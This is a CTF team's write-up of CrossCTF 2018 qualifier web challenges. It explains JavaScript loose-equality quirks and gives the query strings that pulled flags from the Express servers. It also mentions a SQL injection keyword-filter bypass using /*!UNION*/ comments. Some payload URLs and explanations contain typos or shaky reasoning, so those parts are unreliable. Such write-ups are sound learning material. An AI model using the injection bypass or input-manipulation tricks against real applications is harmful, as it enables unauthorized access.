# Crossctf 2018 Qualifier Writeups (WIP)

Credits to my teammates: https://github.com/tankeehock and https://github.com/tohzijie

## Web
QruirkyScript 1 - 5 were do-able by referncing the truthy table from: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness

### QuirkyScript 1
```
var flag = require("./flag.js");
var express = require('express')
var app = express()

app.get('/flag', function (req, res) {
    if (req.query.first) {
        if (req.query.first.length == 8 && req.query.first == ",,,,,,," ) {
            res.send(flag.flag);
            return;
        }
    }
    res.send("Try to solve this.");
});

app.listen(31337)
```

The following condition must be met: Length = 8 and variable must be ',,,,,,,'. To achieve this, an empty array of size 8 will match the length 8, and the empty commas in the array will be treated as a string of commas when the following is passed in: [,,,,,,,]

Therefore, to achieve this, the following get request will fulfill the conditions: ```http://target/flag?first=&first=&first=&first=&first=&first=&first=&first=&first=```

CrossCTF{C0mm4s_4ll_th3_w4y_t0_th3_fl4g}



### QuirkyScript 2
```
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function(req, res) {
    if (req.query.second) {
        if (req.query.second != "1" && req.query.second.length == 10 && req.query.second == true) {
            res.send(flag.flag);
            return;
        }
    }
    res.send("Try to solve this.");
});
app.listen(31337)
```

The following condition must be met: Length = 10 and variable must be TRUE. To achieve this, we need to abuse the weak comparator. In javascript, 1 = true, and 0000000001 == true. (Got this from multiple testing of how values are compared. Read the above link for more information on how == comapres values)

Therefore, to achieve this, the following get request will fulfill the conditions: ```http://target/flag?second?=0000000001```

CrossCTF{M4ny_w4ys_t0_mak3_4_numb3r}



### QuirkyScript 3 (to be updated)
```
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function(req, res) {
    if (req.query.third) {
        if (Array.isArray(req.query.third)) {
            third = req.query.third;
            third_sorted = req.query.third.sort();
            if (Number.parseInt(third[0]) > Number.parseInt(third[1]) && third_sorted[0] == third[0] && third_sorted[1] == third[1]) {
                res.send(flag.flag);
                return;
            }
        }
    }
    res.send("Try to solve this.");
});
app.listen(31337)
```
The following condition must be met after the array is sorted. The first element in the array (after converting into an Integer) must be larger than the second element (after converstion) and the indexes of the element in the original array before and after sorting must be the same. We understand that the browser will take in our GET request as a string and the sorting will be done based on the first character of the string.

To achieve the conditions, we look into the ascii table to find the hexadecimal representation of each number and chose a relatively large number which has hexadecimal starting with 0. We chose 0xA (Decimal 10). ```http://target/flag?third?=0xA&third=1```

CrossCTF{th4t_r0ck3t_1s_hug3}



### QuirkyScript 4
```
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function(req, res) {
    if (req.query.fourth) {
        if (req.query.fourth == 1 && req.query.fourth.indexOf("1") == -1) {
            res.send(flag.flag);
            return;
        }
    }
    res.send("Try to solve this.");
});
app.listen(31337)
```

The following condition must be met: variable = 1 and "1" is not the variable. WUT?!
To achieve this, we need to abuse the weak comparator. In javascript, [0x01] == 1 (WOW), and suprisingly, if a=[0x01], a.indexOf("1") = -1. SO CONDITION IS MET! Additionally, I remembered from one of my web class that we can past in an array for GET request using the [].

Therefore, to achieve this, the following get request will fulfill the conditions: ```http://ctf.pwn.sg:8084/flag?fourth[]=0x01```

CrossCTF{1m_g0ing_hungry}



### QuirkyScript 5
```
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function(req, res) {
    var re = new RegExp('^I_AM_ELEET_HAX0R$', 'g');
    if (re.test(req.query.fifth)) {
        if (req.query.fifth === req.query.six && !re.test(req.query.six)) {
            res.send(flag.flag);
        }
    }
    res.send("Try to solve this.");
});
app.listen(31337)
```

For this, me and my teammates were not able to explain why our GET request worked. But it seems like passing ```I_AM_ELEET_HAX0R``` to variables firth and six fulfills the if condition.

Therefore, to achieve this, the following get request will fulfill the conditions: ```http://ctf.pwn.sg:8085/flag?fifth=I_AM_ELEET_HAX0R&six=I_AM_ELEET_HAX0R```

CrossCTF{1_am_n1k0las_ray_zhizihizhao}


### Babyweb

This was a SQL injection challenge. The script disallowed certain keywords, but this can be overcome by using the /*!KEYWORD*/ method. Example (/*!UNION*/)



# Crossctf 2018 Finals Writeups (WIP)
